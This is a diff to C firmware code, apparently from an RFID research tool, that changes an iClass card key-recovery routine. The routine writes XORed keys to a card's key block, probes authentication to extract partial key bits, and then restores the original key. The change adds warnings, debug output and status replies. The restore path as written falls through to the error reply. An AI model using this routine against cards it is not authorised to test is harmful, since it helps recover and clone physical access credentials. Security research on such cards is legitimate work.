@@ -2174,6 +2174,7 @@ void iClass_Recover(iclass_recover_req_t *msg) {
     bool shallow_mod = false;
 
     LED_A_ON();
+    Dbprintf(_RED_("Interrupting this process will render the card unusable!"));
 
     Iso15693InitReader();
     //Authenticate with AA2 with the standard key to get the AA2 mac
@@ -2253,56 +2254,61 @@ Xorring the index of iterations against those decimal numbers allows us to retri
     //START LOOP
     while (bits_found == -1){
 
-    //Step3 Calculate New Key
-    uint8_t genkeyblock[PICOPASS_BLOCK_SIZE];
-    uint8_t genkeyblock_old[PICOPASS_BLOCK_SIZE];
-    uint8_t xorkeyblock[PICOPASS_BLOCK_SIZE];
-    generate_single_key_block_inverted(zero_key, index, genkeyblock);
+        //Step3 Calculate New Key
+        uint8_t genkeyblock[PICOPASS_BLOCK_SIZE];
+        uint8_t genkeyblock_old[PICOPASS_BLOCK_SIZE];
+        uint8_t xorkeyblock[PICOPASS_BLOCK_SIZE];
+        generate_single_key_block_inverted(zero_key, index, genkeyblock);
 
-    //NOTE BEFORE UPDATING THE KEY WE NEED TO KEEP IN MIND KEYS ARE XORRED
-    //xor the new key against the previously generated key so that we only update the difference
-    if(index != 0){
-        generate_single_key_block_inverted(zero_key, index - 1, genkeyblock_old);
-        for (int i = 0; i < 8 ; i++) {
-            xorkeyblock[i] = genkeyblock[i] ^ genkeyblock_old[i];
-        }
-    }else{
+        //NOTE BEFORE UPDATING THE KEY WE NEED TO KEEP IN MIND KEYS ARE XORRED
+        //xor the new key against the previously generated key so that we only update the difference
+        if(index != 0){
+            generate_single_key_block_inverted(zero_key, index - 1, genkeyblock_old);
+            for (int i = 0; i < 8 ; i++) {
+                xorkeyblock[i] = genkeyblock[i] ^ genkeyblock_old[i];
+            }
+        }else{
             memcpy(xorkeyblock, genkeyblock, PICOPASS_BLOCK_SIZE);
-    }
-
-    //Step4 Calculate New Mac
-
-    bool use_mac = true;
-    uint8_t wb[9] = {0};
-    blockno = 3;
-    wb[0] = blockno;
-    memcpy(wb + 1, xorkeyblock, 8);
-
-    doMAC_N(wb, sizeof(wb), div_key2, mac2);
-
-    //Step5 Perform Write
-
-    if (iclass_writeblock_ext(blockno, xorkeyblock, mac2, use_mac, shallow_mod)) {
-        Dbprintf("Write block [%3d/0x%02X] " _GREEN_("successful"), blockno, blockno);
-    } else {
-        Dbprintf("Write block [%3d/0x%02X] " _RED_("failed"), blockno, blockno);
-        goto out;
-    }
-    //Step6 Perform 8 authentication attempts
-
-    for (int i = 0; i < 8 ; ++i) {
-        //need to craft the authentication payload accordingly
-        memcpy(msg->req.key, iclass_mac_table[i], 8);
-        res = authenticate_iclass_tag(&msg->req, &hdr, &start_time, &eof_time, mac1); //mac1 here shouldn't matter
-        if (res == true) {
-            bits_found = iclass_mac_table_bit_values[i] ^ index;
-            Dbprintf("Found Card Bits Index: " _GREEN_("[%3d]"), index);
-            Dbprintf("Mac Table Bit Values: " _GREEN_("[%3d]"), iclass_mac_table_bit_values[i]);
-            Dbprintf("Decimal Value of Partial Key: " _GREEN_("[%3d]"), bits_found);
-            goto restore;
         }
-    }
 
+        //Step4 Calculate New Mac
+
+        bool use_mac = true;
+        uint8_t wb[9] = {0};
+        blockno = 3;
+        wb[0] = blockno;
+        memcpy(wb + 1, xorkeyblock, 8);
+        doMAC_N(wb, sizeof(wb), div_key2, mac2);
+
+        //Step5 Perform Write
+
+        DbpString("Generated XOR Key: ");
+        Dbhexdump(8, xorkeyblock, false);
+
+        if (iclass_writeblock_ext(blockno, xorkeyblock, mac2, use_mac, shallow_mod)) {
+            Dbprintf("Write block [%3d/0x%02X] " _GREEN_("successful"), blockno, blockno);
+        } else {
+            Dbprintf("Write block [%3d/0x%02X] " _RED_("failed"), blockno, blockno);
+            if (index > 1){
+                Dbprintf(_RED_("Card is likely to be unusable!"));
+            }
+            goto out;
+        }
+        //Step6 Perform 8 authentication attempts
+
+        for (int i = 0; i < 8 ; ++i) {
+            //need to craft the authentication payload accordingly
+            memcpy(msg->req.key, iclass_mac_table[i], 8);
+            res = authenticate_iclass_tag(&msg->req, &hdr, &start_time, &eof_time, mac1); //mac1 here shouldn't matter
+            if (res == true) {
+                bits_found = iclass_mac_table_bit_values[i] ^ index;
+                Dbprintf("Found Card Bits Index: " _GREEN_("[%3d]"), index);
+                Dbprintf("Mac Table Bit Values: " _GREEN_("[%3d]"), iclass_mac_table_bit_values[i]);
+                Dbprintf("Decimal Value of Partial Key: " _GREEN_("[%3d]"), bits_found);
+                goto restore;
+            }
+        }
+        index++;
     }//end while
 
 
@@ -2310,10 +2316,6 @@ restore:
     ;//empty statement for compilation
     uint8_t partialkey[PICOPASS_BLOCK_SIZE];
     convertToHexArray(bits_found, partialkey);
-
-    for (int i = 0; i < 8; i++){
-        Dbprintf("Raw Key Partial Bytes: " _GREEN_("[%3d -> 0x%02X]"), i, partialkey);
-    }
 
     uint8_t resetkey[PICOPASS_BLOCK_SIZE];
     convertToHexArray(index, resetkey);
@@ -2325,19 +2327,26 @@ restore:
     blockno = 3;
     wb[0] = blockno;
     memcpy(wb + 1, resetkey, 8);
-
     doMAC_N(wb, sizeof(wb), div_key2, mac2);
+
+    //Write back the card to the original key
+    DbpString(_YELLOW_("Restoring Card to the original key using Reset Key: "));
+    Dbhexdump(8, resetkey, false);
     if (iclass_writeblock_ext(blockno, resetkey, mac2, use_mac, shallow_mod)) {
-        Dbprintf("Restore of Original Key [%3d/0x%02X] " _GREEN_("successful"), blockno, blockno);
+        Dbprintf("Restore of Original Key "_GREEN_("successful. Card is usable again."));
     } else {
-        Dbprintf("Restore of Original Key [%3d/0x%02X] " _RED_("failed"), blockno, blockno);
+        Dbprintf("Restore of Original Key " _RED_("failed. Card is likely unusable."));
     }
+    //Print the 24 bits found from k1
+    DbpString(_YELLOW_("Raw Key Partial Bytes: "));
+    Dbhexdump(8, partialkey, false);
     switch_off();
+    reply_ng(CMD_HF_ICLASS_RECOVER, PM3_SUCCESS, NULL, 0);
 
 
 out:
 
     switch_off();
-
+    reply_ng(CMD_HF_ICLASS_RECOVER, PM3_ESOFT, NULL, 0);
 
 }
